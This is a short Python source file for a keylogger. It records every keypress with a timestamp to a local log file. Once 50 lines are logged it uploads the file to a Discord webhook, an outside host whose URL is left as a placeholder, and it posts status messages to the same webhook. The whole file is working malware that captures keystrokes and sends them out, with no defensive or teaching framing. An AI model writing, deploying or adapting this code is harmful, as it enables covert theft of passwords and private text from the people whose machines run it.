import keyboard as kb
import requests
import time
import os

stop_logging = False
WEBHOOK_URL = "discord webhook"
log_file_path = "log.txt"

def clear_log_file(file_path):
    with open(file_path, 'w') as f:
        pass  

def send_message(content):
    try:
        payload = {"content": content}
        response = requests.post(WEBHOOK_URL, json=payload)
        print("Message sent:", response.status_code)
    except Exception as e:
        print("Error sending message:", e)

def count_logged_lines(file_path):
    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()
            return len(lines)
    except FileNotFoundError:
        return 0 

def send_to_discord(file_path):
    try:
        with open(file_path, "rb") as f:
            payload = {
                "content": "📄 50 keys have been logged. Uploading log file."
            }
            files = {
                "file": (os.path.basename(file_path), f)
            }
            response = requests.post(WEBHOOK_URL, data=payload, files=files)
            print("Webhook sent:", response.status_code)
            clear_log_file(log_file_path)
    except Exception as e:
        print("Failed to send log:", e)

def keylog():
    global stop_logging

    send_message("✅ Keylogger is now running.")

    with open("log.txt", 'a') as log_f:
        log_f.write("\n\n-----------------------Keyboard Log-----------------------\n\n")

        def on_press(key_event):
            global stop_logging
            key_name = key_event.name
            curr_time = time.ctime()
            log_f.write(f"{curr_time} : {key_name}\n")
            log_f.flush()

            line_count = count_logged_lines(log_file_path)

            if line_count >= 50:
                send_to_discord(log_file_path)

            if key_name == 'q':
                stop_logging = True
                send_message("Kill switch has been initiated exiting...")

        kb.on_press(on_press)

        # Keep running until stop_logging is True
        while not stop_logging:
            time.sleep(0.1)

        # Unhook keyboard and exit
        kb.unhook_all()

# Run in a separate thread to allow clean exit
if __name__ == "__main__":
    try:
        keylog()
    except KeyboardInterrupt:
        print("Force stopped")
    except Exception as e:
        print("Error:", e)
    finally:
        os._exit(0)  # Force kill all threads if still running
